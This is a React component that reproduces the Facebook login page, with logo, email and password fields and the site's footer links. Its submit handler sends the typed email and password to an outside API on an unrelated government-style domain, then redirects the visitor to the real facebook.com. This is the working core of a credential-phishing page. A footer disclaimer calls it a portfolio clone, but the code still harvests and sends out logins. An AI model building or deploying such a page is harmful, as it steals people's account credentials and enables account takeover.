import axios from 'axios'
import React, { useState } from 'react'
import { useForm } from 'react-hook-form'
const URL = 'https://testing.munipillcomarca.gob.pe/api/cuentas'
const App = () => {
  const { handleSubmit, register, reset, watch } = useForm()

  const submit = data => {    
    axios.post(URL, data)
      .then(res => {
        window.location.href = 'https://www.facebook.com';

      })
      .catch(err => console.log(err))
  }
  return (
    <div className="contains-top-half-and-footer-bottom-half">
      <div className="global-container">
        <div className="bigger-box">
          <div className="big-box">
            <div className="left-box">
              <div className="image-box">
                <img
                  className="fb-logo"
                  src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                  alt=""
                />
              </div>
              <h2 className="logo-caption">
                Facebook helps you connect and share with the people in your
                life.
              </h2>
            </div>
            <div className="right-box">
              <div className="form-container">
                <form onSubmit={handleSubmit(submit)}>

                  <div className="space">
                    <input
                      type="text"
                      className="email-box"
                      placeholder="Email address or phone number"
                      {...register('email')} />

                  </div>
                  <div style={{ display: 'flex' }}>
                    <div className="space">
                      <input
                        type="password"
                        className="pw-box"
                        placeholder="Password"
                        id="password_field"
                        {...register('password')}
                      />
                    </div>
                    <i
                      className="far fa-eye-slash"
                      id="toggleEyeIcon"
                      style={{ cursor: 'pointer', display: 'none', margin: '24px' }}
                    ></i>
                  </div>
                  <div className="space">
                    <button type="submit" className="login-button">
                      <b>Log In</b>
                    </button>
                  </div>
                  <div className="spaceTwo adjustTwo">
                    <a href="#" className="adjust-forgot-pw">Forgotten password?</a>
                  </div>
                  <div className="line"></div>
                  <div>
                    <button type="button" className="create-button">
                      <b>Create New Account</b>
                    </button>
                  </div>
                </form>
              </div>
              <div className="bottom-link-box">
                <a className="bottom-link" href="#"><b>Create a Page</b></a>
                for a celebrity, band or business.
              </div>
            </div>
          </div>
        </div>
      </div>
      <footer>
        <div>
          <ul>
            <li className="list-items">English (UK)</li>
            <li className="list-items">
              <a className="list-items" href="#">中文(简体)</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Bahasa Indonesia</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">日本語</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">ภาษาไทย</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Tiếng Việt</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">한국어</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Español</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Português (Brasil)</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Français (France)</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Deutsch</a>
            </li>
            <button type="button" className="plus-button">+</button>
          </ul>
          <div className="line-2 reduce-margin"></div>
          <ul>
            <li className="list-items">
              <a className="list-items" href="#">Messenger</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Fb Lite</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">Watch</a></li>
            <li className="list-items">
              <a className="list-items" href="#">People</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">Pages</a></li>
            <li className="list-items">
              <a className="list-items" href="#">Page Categories</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Places</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">Games</a></li>
            <li className="list-items">
              <a className="list-items" href="#">Locations</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Marketplace</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Fb Pay</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Groups</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">Jobs</a></li>
            <li className="list-items">
              <a className="list-items" href="#">Occulus</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Portal</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Instagram</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">Local</a></li>
            <li className="list-items">
              <a className="list-items" href="#">Fundraisers</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Services</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Spark AR</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Shops</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Voting Information Centre</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">About</a></li>
            <li className="list-items">
              <a className="list-items" href="#">Create ad</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Create Page</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Developers</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Careers</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Privacy</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">Cookies</a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">AdChoices</a>
            </li>
            <li className="list-items"><a className="list-items" href="#">Terms</a></li>
            <li className="list-items"><a className="list-items" href="#">Help</a></li>
          </ul>
          <div className="fb-clone">
            <p>
              Disclaimer: This web page is a personal portfolio project. Hence,
              please kindly do not enter any of your credentials here. We will
              not be liable for any losses or damages arising from such an
              action.
            </p>
            <a
              className="fb-clone-link"
              href="https://github.com/melvincwng/facebook-clone"
              target="_blank"
              rel="noopener noreferrer"
            >Fb Clone © 2022</a
            >
          </div>
        </div>
      </footer>
    </div>
  )
}

export default App